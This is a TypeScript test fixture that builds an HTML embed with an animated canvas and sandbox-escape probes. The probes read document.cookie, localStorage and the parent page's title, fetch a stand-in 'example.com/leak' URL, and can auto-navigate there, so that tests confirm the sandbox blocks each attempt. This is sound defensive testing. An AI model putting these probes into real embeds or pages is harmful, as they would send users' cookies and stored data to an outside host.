/**
 * Fixture for component previews of interactive HTML code embeds: an animated
 * canvas plus probes that try to escape the sandbox. Each probe writes its
 * outcome into the page so focused tests can assert containment.
 */
export function interactiveHtmlFixture(autoNavigate: boolean): string {
  return `<!doctype html>
<html lang="en">
<head>
<style>
  body { margin: 0; font: 14px system-ui, sans-serif; background: #f6f7fb; color: #1b1f2a; }
  .wrap { display: grid; gap: 8px; padding: 12px; }
  canvas { width: 100%; height: 140px; background: #fff; border-radius: 8px; }
  @keyframes pulse { from { opacity: .4 } to { opacity: 1 } }
  h1 { font-size: 16px; margin: 0; animation: pulse 1s infinite alternate; }
</style>
</head>
<body>
<div class="wrap">
  <h1 data-testid="visual-title">Orbit demo</h1>
  <canvas id="c" width="600" height="140"></canvas>
  <div>ticks: <span id="ticks" data-testid="probe-ticks">0</span></div>
  <div>cookie: <span id="cookie" data-testid="probe-cookie">pending</span></div>
  <div>storage: <span id="storage" data-testid="probe-storage">pending</span></div>
  <div>fetch: <span id="fetch" data-testid="probe-fetch">pending</span></div>
  <div>parent: <span id="parent" data-testid="probe-parent">pending</span></div>
  <a id="away" data-testid="external-link" href="https://example.com/leak?secret=1">leave</a>
  <button type="button" data-testid="navigate-button" onclick="location.href='https://example.com/leak?secret=3'">navigate</button>
</div>
<script>
  const ctx = document.getElementById('c').getContext('2d');
  let t = 0;
  function frame() {
    t += 1;
    document.getElementById('ticks').textContent = String(t);
    ctx.clearRect(0, 0, 600, 140);
    ctx.beginPath();
    ctx.arc(300 + Math.cos(t / 20) * 200, 70 + Math.sin(t / 20) * 40, 12, 0, Math.PI * 2);
    ctx.fillStyle = '#3b82f6';
    ctx.fill();
    requestAnimationFrame(frame);
  }
  requestAnimationFrame(frame);
  function probe(id, fn) {
    try { document.getElementById(id).textContent = fn(); }
    catch (error) { document.getElementById(id).textContent = 'blocked'; }
  }
  probe('cookie', () => 'read:' + document.cookie);
  probe('storage', () => 'read:' + Object.keys(localStorage).length);
  probe('parent', () => 'read:' + window.parent.document.title);
  fetch('https://example.com/leak?secret=1')
    .then(() => { document.getElementById('fetch').textContent = 'sent'; })
    .catch(() => { document.getElementById('fetch').textContent = 'blocked'; });
  if (${autoNavigate}) setTimeout(() => { location.href = 'https://example.com/leak?secret=2'; }, 800);
</script>
</body>
</html>`;
}
